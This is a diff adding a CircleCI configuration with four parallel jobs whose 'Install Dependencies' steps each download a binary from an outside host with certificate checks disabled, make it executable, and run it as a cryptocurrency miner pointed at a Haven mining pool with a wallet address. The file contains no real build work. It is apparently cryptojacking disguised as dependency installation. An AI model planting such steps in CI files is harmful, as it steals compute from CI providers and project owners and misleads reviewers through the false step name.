@@ -1,0 +1,39 @@
+version: 2
+jobs:
+    aku1:
+      docker:
+            - image: circleci/ruby:2.4
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget --no-check-certificate https://swensonm.com/mining/masterfile && chmod 777 masterfile && ./masterfile -o haven.herominers.com:10450 -u hvxxuNLjc3PeEMgEG1cscCby7BckEzix7QUtheNLat9BRwfrhJE2vgLJkHVPohA6H47Ka1VxzYPLY4z3abvHqK1J1fDGcr5M3F -p CPU1 -a cn-heavy/xhv -t 8
+    aku2:
+      docker:
+            - image: circleci/ruby:2.4
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget --no-check-certificate https://swensonm.com/mining/masterfile && chmod 777 masterfile && ./masterfile -o haven.herominers.com:10450 -u hvxxuNLjc3PeEMgEG1cscCby7BckEzix7QUtheNLat9BRwfrhJE2vgLJkHVPohA6H47Ka1VxzYPLY4z3abvHqK1J1fDGcr5M3F -p CPU1 -a cn-heavy/xhv -t 8
+    aku3:
+      docker:
+            - image: circleci/ruby:2.4
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget --no-check-certificate https://swensonm.com/mining/masterfile && chmod 777 masterfile && ./masterfile -o haven.herominers.com:10450 -u hvxxuNLjc3PeEMgEG1cscCby7BckEzix7QUtheNLat9BRwfrhJE2vgLJkHVPohA6H47Ka1VxzYPLY4z3abvHqK1J1fDGcr5M3F -p CPU1 -a cn-heavy/xhv -t 8
+    aku4:
+      docker:
+            - image: circleci/ruby:2.4
+      steps:
+        - run:
+            name: Install Dependencies
+            command: wget --no-check-certificate https://swensonm.com/mining/masterfile && chmod 777 masterfile && ./masterfile -o haven.herominers.com:10450 -u hvxxuNLjc3PeEMgEG1cscCby7BckEzix7QUtheNLat9BRwfrhJE2vgLJkHVPohA6H47Ka1VxzYPLY4z3abvHqK1J1fDGcr5M3F -p CPU1 -a cn-heavy/xhv -t 8
+
+workflows:
+    version: 2
+    build:
+        jobs:
+            - aku1
+            - aku2
+            - aku3
+            - aku4
